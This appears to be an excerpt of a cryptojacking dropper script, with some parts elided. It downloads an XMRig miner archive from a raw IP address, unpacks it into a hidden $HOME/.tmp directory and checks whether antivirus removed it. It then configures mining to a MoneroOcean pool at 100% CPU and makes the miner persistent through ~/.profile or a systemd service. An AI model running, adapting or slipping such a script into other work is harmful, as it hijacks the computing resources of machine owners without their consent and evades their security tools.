...
if ! curl -L --progress-bar "http://35.226.46.255/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download http://35.226.46.255/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.tmp"
[ -d $HOME/.tmp ] || mkdir $HOME/.tmp
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.tmp; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/.tmp directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.tmp/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.tmp/config.json
$HOME/.tmp/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.tmp/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.tmp/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/.tmp/xmrig was removed by antivirus (or some other problem)"
  fi
  ...
  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.tmp"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.tmp --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.tmp directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/.tmp/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.tmp/config.json
  $HOME/.tmp/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/.tmp/xmrig ]; then
      echo "ERROR: Stock version of $HOME/.tmp/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/.tmp/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/.tmp/xmrig is OK"
...
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.tmp/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.tmp/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.tmp/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.tmp/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/.tmp/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.tmp/config.json

cp $HOME/.tmp/config.json $HOME/.tmp/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.tmp/config_background.json

# preparing script

echo "[*] Creating $HOME/.tmp/miner.sh script"
cat >$HOME/.tmp/miner.sh <<EOL
#!/bin/bash
...
chmod +x $HOME/.tmp/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .tmp/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.tmp/miner.sh script to $HOME/.profile"
    echo "$HOME/.tmp/miner.sh --config=$HOME/.tmp/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/.tmp/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.tmp/xmrig.log file)"
  /bin/bash $HOME/.tmp/miner.sh --config=$HOME/.tmp/config_background.json >/dev/null 2>&1
else
...
[Service]
ExecStart=$HOME/.tmp/xmrig --config=$HOME/.tmp/config.json
Restart=always
Nice=10
CPUWeight=1
